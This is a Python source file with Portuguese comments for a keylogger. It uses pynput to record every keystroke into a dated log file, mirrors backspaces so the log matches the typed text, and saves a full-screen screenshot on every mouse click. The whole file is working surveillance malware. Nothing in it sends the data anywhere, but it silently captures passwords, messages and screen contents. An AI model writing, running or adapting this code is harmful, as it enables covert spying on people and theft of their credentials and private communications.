from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
from datetime import datetime
import re
import os
import pyautogui as pya


dataAtual = datetime.now()  # Pegando a data do sistema / servidor
# Tratando variavel para pegar apenas dia e mês
data = dataAtual.strftime("%d-%m")
diretorioRaiz = "D:\keylogger\keylogger_" + data + "/"
arquivoLog = diretorioRaiz + "keylogger.log"  # setando arquivo de log


try:
    os.mkdir(diretorioRaiz)  # tentando criar o diretorio
except:
    pass


def on_press(tecla):
    tecla = str(tecla)  # salvando em uma string
    tecla = re.sub(r'\'', '', tecla)  # retirando as '' da tecla
    # retirando o key.space por um espaço de verdade
    tecla = re.sub(r'Key.space', ' ', tecla)
    # retirando o key.enter por uma quebra de linha
    tecla = re.sub(r'Key.enter', '\n', tecla)
    # retirando o key.tab pela mesma função do mesmo
    tecla = re.sub(r'Key.tab', '\t', tecla)
    # retirando o key.backspace por um apagar
    tecla = re.sub(r'Key.backspace', 'apagar', tecla)
    # retirando os keys que sobraram por um caracter vazio
    tecla = re.sub(r'Key.*', '', tecla)

    with open(arquivoLog, 'a') as log:  # abrindo arquivo log
        if str(tecla) == str("apagar"):
            # se o arquivo tiver algum conteudo ele ira rodar esse if
            if os.stat(arquivoLog).st_size != 0:
                tecla = re.sub(r'Key.backspace', '', tecla)
                log.seek(0, 2)
                caractere = log.tell()  # colocando o ponto de inserção no final do arquivo
                # Apagando a ultima coisa que o usuario digitou
                log.truncate(caractere - 1)
        else:
            log.write(tecla) # escrevendo as teclas no arquivo


# Função para tirar print da tela usando os parametros de coordenadas e botão que está sendo pressionado
def on_click(x, y, buttom, pressed):
    if pressed:
        minhaPrint = pya.screenshot()  # tirando a Print da tela, e salvando em uma variavel
        hora = datetime.now()
        horarioPrint = hora.strftime("%H_%M_%S")
        # salvando a imagem dentro da pastas
        minhaPrint.save(os.path.join(
            diretorioRaiz, "printKeylogger" + horarioPrint + ".jpg"))


KeyboardListener = KeyboardListener(
    on_press=on_press)  # cr iando variavel do teclado
MouseListener = MouseListener(on_click=on_click)  # criando variavel do mouse

KeyboardListener.start()  # Startando teclado
MouseListener.start()  # Startando mouse
KeyboardListener.join()
MouseListener.join()
